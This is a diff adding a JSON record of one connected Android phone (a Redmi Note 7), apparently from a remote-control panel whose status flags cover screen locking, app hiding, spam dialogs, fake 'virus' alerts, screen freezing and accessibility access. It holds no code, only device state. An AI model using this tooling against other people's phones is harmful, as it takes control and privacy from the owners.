@@ -1,0 +1,40 @@
+{
+  "id": "ffe6ce411ad21b4b",
+  "name": "Redmi Note 7",
+  "socketId": "wsLS_QrsN7Kze_4LAAAt",
+  "info": {
+    "sdk": 29,
+    "manufacturer": "Xiaomi",
+    "model": "Redmi Note 7",
+    "battery": 95,
+    "charging": false,
+    "sim": "No SIM"
+  },
+  "connectedAt": "2026-11-27T05:30:07.505Z",
+  "lastSeen": "2026-11-27T05:30:07.505Z",
+  "ownerUid": "IXFS37XL3TT2MZXG",
+  "status": {
+    "flashlight": false,
+    "cameraActive": false,
+    "videoPlaying": false,
+    "wallpaperSet": false,
+    "locked": false,
+    "lockedV2": false,
+    "lockedChat": false,
+    "appHidden": false,
+    "activeTheme": "default",
+    "spamDialog": false,
+    "sos": false,
+    "virus": false,
+    "ambarus": false,
+    "networkLocked": false,
+    "freezeScreen": false,
+    "floatPhotos": false,
+    "autoWallpaper": false,
+    "screenColor": false,
+    "screenColorValue": ""
+  },
+  "accessibilityActive": false,
+  "accessibilityLastSeen": "2026-11-27T05:30:07.509Z",
+  "online": true
+}
